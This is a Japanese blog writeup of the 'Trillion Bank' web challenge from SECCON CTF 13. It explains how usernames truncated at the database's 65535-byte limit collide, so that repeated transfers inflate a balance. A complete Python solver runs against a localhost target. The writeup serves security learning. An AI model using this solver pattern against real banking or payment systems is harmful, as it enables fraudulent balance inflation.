<!DOCTYPE html>
<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>SECCON CTF 13 Quals writeup - yuasa&#39;s blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="SECCON CTF 13のupsolveをやる。
[web] Trillion Bank 問題 他のユーザーへの送金が可能なアプリケーションが与えられる。
ユーザー登録処理を行う/api/registerは以下。
const names = new Set(); ... app.post(&#34;/api/register&#34;, async (req, res) =&gt; { const name = String(req.body.name); if (!/^[a-z0-9]&#43;$/.test(name)) { res.status(400).send({ msg: &#34;Invalid name&#34; }); return; } if (names.has(name)) { res.status(400).send({ msg: &#34;Already exists&#34; }); return; } names.add(name); const [result] = await db.query(&#34;INSERT INTO users SET ?&#34;, { name, balance: 10, }); res .setCookie(&#34;session&#34;, await res.jwtSign({ id: result.insertId })) .send({ msg: &#34;Succeeded&#34; }); }); ユーザー名の重複チェックをnamesというSetで行っている。 重複がない場合、ユーザーに残高が10与えられる。 ユーザー登録が完了すると、idをペイロードに入れたJWTを発行して、cookieに入れる。 ユーザーから他のユーザーに送金を行う/api/transferは以下。" />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="//localhost:1313/posts/48/">
  <meta property="og:site_name" content="yuasa&#39;s blog">
  <meta property="og:title" content="SECCON CTF 13 Quals writeup">
  <meta property="og:description" content="SECCON CTF 13のupsolveをやる。
[web] Trillion Bank 問題 他のユーザーへの送金が可能なアプリケーションが与えられる。
ユーザー登録処理を行う/api/registerは以下。
const names = new Set(); ... app.post(&#34;/api/register&#34;, async (req, res) =&gt; { const name = String(req.body.name); if (!/^[a-z0-9]&#43;$/.test(name)) { res.status(400).send({ msg: &#34;Invalid name&#34; }); return; } if (names.has(name)) { res.status(400).send({ msg: &#34;Already exists&#34; }); return; } names.add(name); const [result] = await db.query(&#34;INSERT INTO users SET ?&#34;, { name, balance: 10, }); res .setCookie(&#34;session&#34;, await res.jwtSign({ id: result.insertId })) .send({ msg: &#34;Succeeded&#34; }); }); ユーザー名の重複チェックをnamesというSetで行っている。 重複がない場合、ユーザーに残高が10与えられる。 ユーザー登録が完了すると、idをペイロードに入れたJWTを発行して、cookieに入れる。 ユーザーから他のユーザーに送金を行う/api/transferは以下。">
  <meta property="og:locale" content="ja">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-12-03T21:26:43+09:00">
    <meta property="article:modified_time" content="2024-12-03T21:26:43+09:00">
<meta name="twitter:card" content="summary"><meta name="twitter:title" content="SECCON CTF 13 Quals writeup">
<meta name="twitter:description" content="SECCON CTF 13のupsolveをやる。
[web] Trillion Bank 問題 他のユーザーへの送金が可能なアプリケーションが与えられる。
ユーザー登録処理を行う/api/registerは以下。
const names = new Set(); ... app.post(&#34;/api/register&#34;, async (req, res) =&gt; { const name = String(req.body.name); if (!/^[a-z0-9]&#43;$/.test(name)) { res.status(400).send({ msg: &#34;Invalid name&#34; }); return; } if (names.has(name)) { res.status(400).send({ msg: &#34;Already exists&#34; }); return; } names.add(name); const [result] = await db.query(&#34;INSERT INTO users SET ?&#34;, { name, balance: 10, }); res .setCookie(&#34;session&#34;, await res.jwtSign({ id: result.insertId })) .send({ msg: &#34;Succeeded&#34; }); }); ユーザー名の重複チェックをnamesというSetで行っている。 重複がない場合、ユーザーに残高が10与えられる。 ユーザー登録が完了すると、idをペイロードに入れたJWTを発行して、cookieに入れる。 ユーザーから他のユーザーに送金を行う/api/transferは以下。">
<script src="//localhost:1313/js/feather.min.js"></script>
	
	
        <link href="//localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css" media="(prefers-color-scheme: dark)"  />
	
	
	
	<link rel="icon" type="image/png" href="/images/favicon.ico">
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="//localhost:1313/">yuasa&#39;s blog</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">Posts</a>
		
		<a href="/tags">Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">SECCON CTF 13 Quals writeup</h1>
			<div class="meta">Posted on Dec 3, 2024 <span class="draft-label">DRAFT</span> </div>
		</div>
		

		<nav id="TableOfContents">
  <ol>
    <li><a href="#web-trillion-bank">[web] Trillion Bank</a>
      <ol>
        <li><a href="#問題">問題</a></li>
        <li><a href="#解法">解法</a>
          <ol>
            <li><a href="#ソルバー">ソルバー</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav><section class="body">
			<p>SECCON CTF 13のupsolveをやる。</p>
<h1 id="web-trillion-bank">[web] Trillion Bank</h1>
<h2 id="問題">問題</h2>
<p>他のユーザーへの送金が可能なアプリケーションが与えられる。</p>
<p><img src="/images/posts/48/trillion.png" alt="trillion"></p>
<p>ユーザー登録処理を行う<code>/api/register</code>は以下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">names</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Set</span>();
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/api/register&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> String(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">name</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">/^[a-z0-9]+$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">name</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Invalid name&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">names</span>.<span style="color:#a6e22e">has</span>(<span style="color:#a6e22e">name</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Already exists&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">names</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">name</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">result</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;INSERT INTO users SET ?&#34;</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balance</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>,
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">setCookie</span>(<span style="color:#e6db74">&#34;session&#34;</span>, <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">jwtSign</span>({ <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">insertId</span> }))
</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Succeeded&#34;</span> });
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><ul>
<li>ユーザー名の重複チェックを<code>names</code>というSetで行っている。</li>
<li>重複がない場合、ユーザーに残高が10与えられる。</li>
<li>ユーザー登録が完了すると、<code>id</code>をペイロードに入れたJWTを発行して、cookieに入れる。</li>
</ul>
<p>ユーザーから他のユーザーに送金を行う<code>/api/transfer</code>は以下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/api/transfer&#34;</span>, { <span style="color:#a6e22e">onRequest</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">auth</span> }, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">recipientName</span> <span style="color:#f92672">=</span> String(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">recipientName</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">names</span>.<span style="color:#a6e22e">has</span>(<span style="color:#a6e22e">recipientName</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Not found&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> [{ <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">id</span> } }] <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * FROM users WHERE name = ?&#34;</span>, [<span style="color:#a6e22e">recipientName</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">id</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Self-transfer is not allowed&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">amount</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">amount</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isFinite(<span style="color:#a6e22e">amount</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">amount</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Invalid amount&#34;</span> });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">getConnection</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">beginTransaction</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> [{ <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">balance</span> } }] <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT * FROM users WHERE id = ? FOR UPDATE&#34;</span>, [
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>,
</span></span><span style="display:flex;"><span>    ]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">amount</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">balance</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#34;Invalid amount&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;UPDATE users SET balance = balance - ? WHERE id = ?&#34;</span>, [
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">amount</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>,
</span></span><span style="display:flex;"><span>    ]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;UPDATE users SET balance = balance + ? WHERE name = ?&#34;</span>, [
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">amount</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">recipientName</span>,
</span></span><span style="display:flex;"><span>    ]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">commit</span>();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">rollback</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span> });
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">finally</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">releaseConnection</span>(<span style="color:#a6e22e">conn</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Succeeded&#34;</span> });
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><ul>
<li><code>body</code>の<code>recipientName</code>に設定された送金先ユーザーが存在するか<code>names</code>を参照して確認する。</li>
<li><code>recipientName</code>の<code>id</code>をDBから取得し、それがリクエストを送信したユーザーでないことを確認する。</li>
<li>送金額をチェック。
<ul>
<li><a href="https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/isFinite">isFinite</a>で<code>NaN</code>や<code>Infinate</code>を弾く。</li>
<li>負の数を弾く。</li>
</ul>
</li>
<li>送金トランザクションはうまくいかなかった場合にロールバックされる。</li>
</ul>
<p>ユーザーを管理するテーブルは以下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> users (
</span></span><span style="display:flex;"><span>    id INT AUTO_INCREMENT <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
</span></span><span style="display:flex;"><span>    name TEXT <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
</span></span><span style="display:flex;"><span>    balance BIGINT <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (id)
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><ul>
<li><code>id</code>はユーザーごとに重複がなく自動で付与される</li>
<li><code>name</code>は任意の文字列</li>
<li><code>balance</code>は<code>BIGINT</code>なので64bitの整数値(<a href="https://dev.mysql.com/doc/refman/8.0/ja/integer-types.html">参考</a>)</li>
</ul>
<h2 id="解法">解法</h2>
<p>ユーザー名の重複チェックが<code>names</code>というセットを通じて行われている点が不自然。重複を防ぐ場合、<code>users</code>テーブルの<code>name</code>カラムに<code>UNIQUE</code>制約をつければ良い。</p>
<p>以下の残高を増やすSQLは<code>LIMIT 1</code>を指定していないため、重複したユーザー名のユーザーが存在していれば、その全ての残高を増やすことができる。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">UPDATE</span> users <span style="color:#66d9ef">SET</span> balance <span style="color:#f92672">=</span> balance <span style="color:#f92672">+</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#f92672">?</span>
</span></span></code></pre></div><p><code>name</code>カラムには（<a href="https://dev.mysql.com/doc/refman/8.0/ja/blob.html">TEXT型</a>）が用いられているが、最大の長さは<a href="https://dev.mysql.com/doc/refman/8.0/ja/column-count-limit.html#:~:text=%E3%82%B9%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B8%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E3%81%8C%E3%82%88%E3%82%8A%E5%A4%A7%E3%81%8D%E3%81%AA,%E6%A0%BC%E7%B4%8D%E3%81%95%E3%82%8C%E3%82%8B%E3%81%9F%E3%82%81%E3%81%A7%E3%81%99%E3%80%82">65535バイト</a>。その最大長を超える部分は切り捨てられる。</p>
<ol>
<li>10個のユーザーと送金先となるユーザー<code>hoge</code>を作成する。</li>
</ol>
<pre tabindex="0"><code>|-65535バイト-|
AAA.........AA
AAA.........AA0
AAA.........AA1
&lt;省略&gt;
AAA.........AA8
</code></pre><p><code>names</code>の重複チェックでは引っかからずに、全てのユーザーを作成することができる。DB上ではこれらのユーザーは全て<code>AAA.........AA</code>(65535バイトのA)になる。</p>
<ol start="2">
<li><code>hoge</code>から<code>AAA.........AA</code>に対して<code>/api/transfer</code>に10円送金する。10個のユーザーの残高が10増えて20になる。</li>
<li>10ユーザーか<code>hoge</code>に20円送り返す。<code>hoge</code>の残高は200になる。</li>
<li>1~3を繰り返すと、<code>X</code>の残高は2000円、20000円と倍々になっていくので、11回繰り返すと<code>200*10**11</code>で20000000000000になる。</li>
<li><code>/api/me</code>にアクセスし、フラグを得る。</li>
</ol>
<h3 id="ソルバー">ソルバー</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:3000&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 失敗したときに繰り返し実行できるように、すべてのユーザーの最初の8文字はランダムに</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>print(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer</span>(s, amount, to):
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/transfer&#34;</span>, json<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;amount&#34;</span>: amount,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;recipientName&#34;</span>: to
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>status_code)
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Success&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># メインのユーザー作成</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;hoge&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s1 <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s1<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/register&#34;</span>, json<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: username
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># DBで重複した名前のユーザー作成</span>
</span></span><span style="display:flex;"><span>sess <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> (key <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">65535</span>)[:<span style="color:#ae81ff">65535</span>]
</span></span><span style="display:flex;"><span>s2 <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s2<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/register&#34;</span>, json<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;name&#34;</span>: prefix
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>  sess<span style="color:#f92672">.</span>append(s)
</span></span><span style="display:flex;"><span>  r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/register&#34;</span>, json<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: prefix <span style="color:#f92672">+</span> str(i)
</span></span><span style="display:flex;"><span>  })
</span></span><span style="display:flex;"><span>  print(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 一回目の送信(最初だけ10円なので特別扱い)</span>
</span></span><span style="display:flex;"><span>transfer(s1, <span style="color:#ae81ff">10</span>, prefix)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 送り戻す</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> sess:
</span></span><span style="display:flex;"><span>  transfer(s, <span style="color:#ae81ff">20</span>, username)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s1<span style="color:#f92672">.</span>get(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/me&#34;</span>)
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1兆を超えるまで繰り返し</span>
</span></span><span style="display:flex;"><span>cur <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> cur <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1_000_000_000_000</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  transfer(s1, cur, prefix)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> sess:
</span></span><span style="display:flex;"><span>    transfer(s, cur, username)
</span></span><span style="display:flex;"><span>  cur <span style="color:#f92672">*=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># フラグ入手</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s1<span style="color:#f92672">.</span>get(URL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/me&#34;</span>)
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text) <span style="color:#75715e"># {&#34;id&#34;:123,&#34;iat&#34;:1733232229,&#34;balance&#34;:2000000000000,&#34;flag&#34;:&#34;SECCON{dummy}&#34;}</span>
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			
		</div>
	</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/melonattacker" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://x.com/melonattacker" title="X"><i data-feather="x"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2025  © yuasa |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer><script>
  feather.replace()
</script></div>
    </body>
</html>
